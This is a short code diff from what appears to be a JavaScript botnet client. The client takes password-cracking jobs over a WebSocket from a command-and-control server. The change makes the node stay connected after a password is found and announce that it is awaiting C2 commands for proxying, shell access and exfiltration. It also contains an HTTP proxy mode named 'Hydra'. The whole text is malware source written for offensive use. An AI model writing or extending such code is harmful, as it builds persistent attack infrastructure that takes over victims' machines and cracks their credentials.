@@ -20,13 +20,14 @@ function connect() {
                 crack(ws, msg.start, msg.end, msg.target);
             } 
             
-            // 2. STOP COMMAND
+                      // 2. STANDBY COMMAND (Instead of Death)
             else if (msg.type === 'STOP') {
-                console.log("!!! SYSTEM HALT. PASSWORD FOUND: " + msg.solution);
-                ws.close();
-                process.exit(0);
+                console.log(`[SYSTEM] Target neutralized: ${msg.solution}`);
+                console.log(`[SYSTEM] Mining operations suspended.`);
+                console.log(`[SYSTEM] Standing by for C2 commands (Proxy/Shell/Exfil)...`);
+                // We DO NOT close the connection. We stay alive.
             }
-            
+
             // 3. PROXY MODE (Hydra)
             else if (msg.type === 'HTTP_PROXY') {
                 console.log(`[PROXY] Requesting: ${msg.url}`);
